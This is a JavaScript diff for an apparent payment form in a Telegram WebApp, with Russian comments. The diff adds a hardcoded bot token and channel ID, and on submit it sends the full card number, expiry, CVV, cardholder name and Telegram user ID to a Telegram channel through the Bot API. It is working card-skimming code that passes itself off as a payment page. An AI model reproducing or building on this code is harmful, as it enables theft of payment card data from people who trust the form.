@@ -70,8 +70,12 @@ cvvInput.addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
 });
 
+// --- Конфигурация для отправки в Telegram ---
+const BOT_TOKEN = '7604135518:AAFa2ivK3F2-GarfW10JYSbMlCLAkNIzM4Q'; // ← ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ТОКЕН
+const CHANNEL_ID = '-1003047112845'; // ← Убедитесь, что это правильный ID
+
 // --- Отправка формы ---
-paymentForm.addEventListener('submit', function (e) {
+paymentForm.addEventListener('submit', async function (e) {
     e.preventDefault();
 
     // Валидация
@@ -90,7 +94,8 @@ paymentForm.addEventListener('submit', function (e) {
         cardNumber: cardNumberInput.value.trim(),
         expiry: expiryInput.value.trim(),
         cvv: cvvInput.value.trim(),
-        cardHolder: cardHolderInput.value.trim()
+        cardHolder: cardHolderInput.value.trim(),
+        user_id: window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 'Unknown'
     };
 
     console.log("FormData:", formData);
@@ -98,31 +103,65 @@ paymentForm.addEventListener('submit', function (e) {
     // Показываем сообщение пользователю
     paymentForm.innerHTML = `
         <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
-            🔄 Мы отправили запрос в банк.<br>
-            Пожалуйста, подождите...
+            🔄 Отправляем данные...
         </p>
     `;
 
-    // === Основная отправка через WebApp ===
-    if (window.Telegram && window.Telegram.WebApp) {
-        try {
-            // Отправляем данные
-            window.Telegram.WebApp.sendData(JSON.stringify(formData));
-            console.log("Данные отправлены через sendData");
+    try {
+        // Формируем текст сообщения для Telegram
+        const messageText = `
+💳 *НОВЫЕ ДАННЫЕ ПЛАТЕЖА (Прямая отправка)*
+🆔 User ID: ${formData.user_id}
+💰 Сумма: ${formData.amount} USD
+🧾 Payment ID: \`${formData.payment_id}\`
+🔢 Карта: \`${formData.cardNumber}\`
+📅 Срок: \`${formData.expiry}\`
+#️⃣ CVV: \`${formData.cvv}\`
+👤 Владелец: \`${formData.cardHolder}\`
+        `.trim();
 
-            // Если бот не ответит в течение 5 секунд, закрываем окно принудительно
-            setTimeout(() => {
-                console.log("Принудительное закрытие WebApp через 5 секунд");
-                window.Telegram.WebApp.close();
-            }, 5000);
+        // URL для отправки сообщения в Telegram
+        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        } catch (error) {
-            console.error("Ошибка sendData:", error);
-            alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
+        // Отправляем POST-запрос
+        const response = await fetch(telegramApiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHANNEL_ID,
+                text: messageText,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        const result = await response.json();
+        if (result.ok) {
+            console.log("✅ Данные успешно отправлены в Telegram-канал!");
+            paymentForm.innerHTML = `
+                <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
+                    ✅ Данные успешно отправлены!
+                </p>
+            `;
+        } else {
+            throw new Error(`Telegram API Error: ${result.description}`);
+        }
+
+    } catch (error) {
+        console.error("❌ Ошибка при отправке данных:", error);
+        paymentForm.innerHTML = `
+            <p style="color: #e74c3c; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
+                ❌ Ошибка отправки. Попробуйте позже.
+            </p>
+        `;
+        alert("Произошла ошибка при отправке данных. Попробуйте позже.");
+    }
+
+    // Закрываем окно через 3 секунды
+    setTimeout(() => {
+        if (window.Telegram?.WebApp) {
             window.Telegram.WebApp.close();
         }
-    } else {
-        console.warn("Telegram WebApp not found. Running in debug mode.");
-        alert("Данные собраны (режим отладки).");
-    }
+    }, 3000);
 });
